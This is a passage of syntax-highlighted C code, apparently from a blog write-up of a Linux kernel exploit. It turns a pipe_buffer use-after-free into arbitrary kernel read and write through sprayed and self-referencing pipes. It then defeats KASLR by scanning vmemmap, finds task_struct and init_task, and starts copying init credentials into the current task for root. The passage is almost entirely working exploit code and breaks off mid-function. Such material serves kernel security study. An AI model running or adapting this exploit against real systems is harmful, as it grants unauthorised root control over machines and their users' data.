class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">corrupting_second_level_pipe_for_pipe_uaf</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">size_t</span> snd_pipe_sz = <span class="number">0x1000</span> * (SND_PIPE_BUF_SZ/<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* let the page&#x27;s ptr at pipe_buffer */</span></span><br><span class="line">    write(pipe_fd[victim_pid][<span class="number">1</span>], buf, SND_PIPE_BUF_SZ*<span class="number">2</span> - <span class="number">24</span> - <span class="number">3</span>*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free orignal pipe&#x27;s page */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] free original pipe...&quot;</span>);</span><br><span class="line">    close(pipe_fd[orig_pid][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[orig_pid][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* try to rehit victim page by reallocating pipe_buffer */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read victim page to check whether we&#x27;ve successfully hit it */</span></span><br><span class="line">    read(pipe_fd[victim_pid][<span class="number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="number">8</span> - <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    read(pipe_fd[victim_pid][<span class="number">0</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span> </span><br><span class="line">           <span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span>, </span><br><span class="line">           info_pipe_buf.page, info_pipe_buf.ops);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">size_t</span>) info_pipe_buf.page &lt; <span class="number">0xffff000000000000</span></span><br><span class="line">        || (<span class="type">size_t</span>) info_pipe_buf.ops &lt; <span class="number">0xffffffff81000000</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to re-hit victim page!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got page leak:\033[0m %p\n&quot;</span>, info_pipe_buf.page);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct a second-level page uaf */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] construct a second-level uaf pipe page...&quot;</span>);</span><br><span class="line">    info_pipe_buf.page = (<span class="keyword">struct</span> page*) ((<span class="type">size_t</span>) info_pipe_buf.page + <span class="number">0x40</span>);</span><br><span class="line">    write(pipe_fd[victim_pid][<span class="number">1</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="type">int</span> nr;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(nr));</span><br><span class="line">        <span class="keyword">if</span> (nr &lt; PIPE_SPRAY_NUM &amp;&amp; i != nr) &#123;</span><br><span class="line">            snd_orig_pid = nr;</span><br><span class="line">            snd_vicitm_pid = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found second-level victim: \033[0m%d &quot;</span></span><br><span class="line">                   <span class="string">&quot;\033[32m\033[1m, orig: \033[0m%d\n&quot;</span>, </span><br><span class="line">                   snd_vicitm_pid, snd_orig_pid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (snd_vicitm_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to corrupt second-level pipe_buffer!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * VI - SECONDARY exploit stage: build pipe for arbitrary read &amp; write</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">building_self_writing_pipe</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">size_t</span> trd_pipe_sz = <span class="number">0x1000</span> * (TRD_PIPE_BUF_SZ/<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">evil_pipe_buf</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page_ptr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* let the page&#x27;s ptr at pipe_buffer */</span></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="number">24</span> <span class="number">-3</span>*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free orignal pipe&#x27;s page */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] free second-level original pipe...&quot;</span>);</span><br><span class="line">    close(pipe_fd[snd_orig_pid][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[snd_orig_pid][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* try to rehit victim page by reallocating pipe_buffer */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* let a pipe-&gt;bufs pointing to itself */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 2nd pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">    evil_pipe_buf.page = info_pipe_buf.page;</span><br><span class="line">    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.ops = info_pipe_buf.ops;</span><br><span class="line">    evil_pipe_buf.flags = info_pipe_buf.flags;</span><br><span class="line">    evil_pipe_buf.private = info_pipe_buf.private;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for third-level victim pipe */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">        <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">            self_2nd_pipe_pid = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found self-writing pipe: \033[0m%d\n&quot;</span>, </span><br><span class="line">                    self_2nd_pipe_pid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self_2nd_pipe_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite the 3rd pipe_buffer to this page too */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 3rd pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for third-level victim pipe */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid</span><br><span class="line">            || i == self_2nd_pipe_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">        <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">            self_3rd_pipe_pid = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                    <span class="string">&quot;%d\n&quot;</span>, self_3rd_pipe_pid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self_3rd_pipe_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite the 4th pipe_buffer to this page too */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 4th pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for third-level victim pipe */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid</span><br><span class="line">            || i == self_2nd_pipe_pid || i== self_3rd_pipe_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">        <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">            self_4th_pipe_pid = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                    <span class="string">&quot;%d\n&quot;</span>, self_4th_pipe_pid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self_4th_pipe_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">evil_2nd_buf</span>, <span class="title">evil_3rd_buf</span>, <span class="title">evil_4th_buf</span>;</span></span><br><span class="line"><span class="type">char</span> temp_zero_buf[<span class="number">0x1000</span>]= &#123; <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief Setting up 3 pipes for arbitrary read &amp; write.</span></span><br><span class="line"><span class="comment"> * We need to build a circle there for continuously memory seeking:</span></span><br><span class="line"><span class="comment"> * - 2nd pipe to search</span></span><br><span class="line"><span class="comment"> * - 3rd pipe to change 4th pipe</span></span><br><span class="line"><span class="comment"> * - 4th pipe to change 2nd and 3rd pipe</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup_evil_pipe</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* init the initial val for 2nd,3rd and 4th pipe, for recovering only */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;evil_2nd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;evil_3rd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;evil_4th_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0xff0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 3rd pipe pointing to 4th */</span></span><br><span class="line">    evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * <span class="number">3</span>;</span><br><span class="line">    evil_3rd_buf.len = <span class="number">0</span>;</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    evil_4th_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_4th_buf.len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">arbitrary_read_by_pipe</span><span class="params">(<span class="keyword">struct</span> page *page_to_read, <span class="type">void</span> *dst)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* page to read */</span></span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0x1ff8</span>;</span><br><span class="line">    evil_2nd_buf.page = page_to_read;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 4th pipe pointing to 2nd pipe */</span></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 2nd pipe for arbitrary read */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], </span><br><span class="line">          temp_zero_buf, </span><br><span class="line">          TRD_PIPE_BUF_SZ-<span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 3rd pipe to point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read out data */</span></span><br><span class="line">    read(pipe_fd[self_2nd_pipe_pid][<span class="number">0</span>], dst, <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">arbitrary_write_by_pipe</span><span class="params">(<span class="keyword">struct</span> page *page_to_write, <span class="type">void</span> *src, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* page to write */</span></span><br><span class="line">    evil_2nd_buf.page = page_to_write;</span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 4th pipe pointing to 2nd pipe */</span></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], </span><br><span class="line">          temp_zero_buf, </span><br><span class="line">          TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 3rd pipe to point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* write data into dst page */</span></span><br><span class="line">    write(pipe_fd[self_2nd_pipe_pid][<span class="number">1</span>], src, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * VII - FINAL exploit stage with arbitrary read &amp; write</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> *tsk_buf, current_task_page, current_task, parent_task, buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">info_leaking_by_arbitrary_pipe</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> *comm_addr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Setting up kernel arbitrary read &amp; write...&quot;</span>);</span><br><span class="line">    setup_evil_pipe();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * KASLR&#x27;s granularity is 256MB, and pages of size 0x1000000 is 1GB MEM,</span></span><br><span class="line"><span class="comment">     * so we can simply get the vmemmap_base like this in a SMALL-MEM env.</span></span><br><span class="line"><span class="comment">     * For MEM &gt; 1GB, we can just find the secondary_startup_64 func ptr,</span></span><br><span class="line"><span class="comment">     * which is located on physmem_base + 0x9d000, i.e., vmemmap_base[156] page.</span></span><br><span class="line"><span class="comment">     * If the func ptr is not there, just vmemmap_base -= 256MB and do it again.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    vmemmap_base = (<span class="type">size_t</span>) info_pipe_buf.page &amp; <span class="number">0xfffffffff0000000</span>;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (vmemmap_base + <span class="number">157</span> * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (buf[<span class="number">0</span>] &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; ((buf[<span class="number">0</span>] &amp; <span class="number">0xfff</span>) == <span class="number">0x070</span>)) &#123;</span><br><span class="line">            kernel_base = buf[<span class="number">0</span>] -  <span class="number">0x070</span>;</span><br><span class="line">            kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n&quot;</span></span><br><span class="line">                   <span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n&quot;</span>, </span><br><span class="line">                   kernel_base, kernel_offset);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        vmemmap_base -= <span class="number">0x10000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* now seeking for the task_struct in kernel memory */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking task_struct in memory...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    prctl(PR_SET_NAME, <span class="string">&quot;arttnba3pwnn&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * For a machine with MEM less than 256M, we can simply get the:</span></span><br><span class="line"><span class="comment">     *      page_offset_base = heap_leak &amp; 0xfffffffff0000000;</span></span><br><span class="line"><span class="comment">     * But that&#x27;s not always accurate, espacially on a machine with MEM &gt; 256M.</span></span><br><span class="line"><span class="comment">     * So we need to find another way to calculate the page_offset_base.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * Luckily the task_struct::ptraced points to itself, so we can get the</span></span><br><span class="line"><span class="comment">     * page_offset_base by vmmemap and current task_struct as we know the page.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * Note that the offset of different filed should be referred to your env.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; <span class="number">1</span>; i++) &#123;</span><br><span class="line">        arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (vmemmap_base + i * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">        comm_addr = memmem(buf, <span class="number">0xf00</span>, <span class="string">&quot;arttnba3pwnn&quot;</span>, <span class="number">12</span>);</span><br><span class="line">        <span class="keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="number">-2</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;cred */</span></span><br><span class="line">            &amp;&amp; (comm_addr[<span class="number">-3</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;real_cred */</span></span><br><span class="line">            &amp;&amp; (comm_addr[<span class="number">-57</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;read_parent */</span></span><br><span class="line">            &amp;&amp; (comm_addr[<span class="number">-56</span>] &gt; <span class="number">0xffff888000000000</span>)) &#123;  <span class="comment">/* task-&gt;parent */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* task-&gt;read_parent */</span></span><br><span class="line">            parent_task = comm_addr[<span class="number">-57</span>];</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* task_struct::ptraced */</span></span><br><span class="line">            current_task = comm_addr[<span class="number">-50</span>] - <span class="number">2528</span>;</span><br><span class="line"></span><br><span class="line">            page_offset_base = (comm_addr[<span class="number">-50</span>]&amp;<span class="number">0xfffffffffffff000</span>) - i * <span class="number">0x1000</span>;</span><br><span class="line">            page_offset_base &amp;= <span class="number">0xfffffffff0000000</span>;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,</span><br><span class="line">                   (<span class="keyword">struct</span> page*) (vmemmap_base + i * <span class="number">0x40</span>));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">                   page_offset_base);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span></span><br><span class="line">                   <span class="string">&quot;0x%lx\n\n&quot;</span>, current_task);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief find the init_task and copy something to current task_struct</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_task_overwrite</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* finding the init_task, the final parent of every task */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking for init_task...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="type">size_t</span> ptask_page_addr = direct_map_addr_to_page_addr(parent_task);</span><br><span class="line"></span><br><span class="line">        tsk_buf = (<span class="type">size_t</span>*) ((<span class="type">size_t</span>) buf + (parent_task &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">        arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) ptask_page_addr, buf);</span><br><span class="line">        arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (ptask_page_addr+<span class="number">0x40</span>),&amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* task_struct::real_parent */</span></span><br><span class="line">        <span class="keyword">if</span> (parent_task == tsk_buf[<span class="number">309</span>]) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parent_task = tsk_buf[<span class="number">309</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    init_task = parent_task;</span><br><span class="line">    init_cred = tsk_buf[<span class="number">363</span>];</span><br><span class="line">    init_nsproxy = tsk_buf[<span 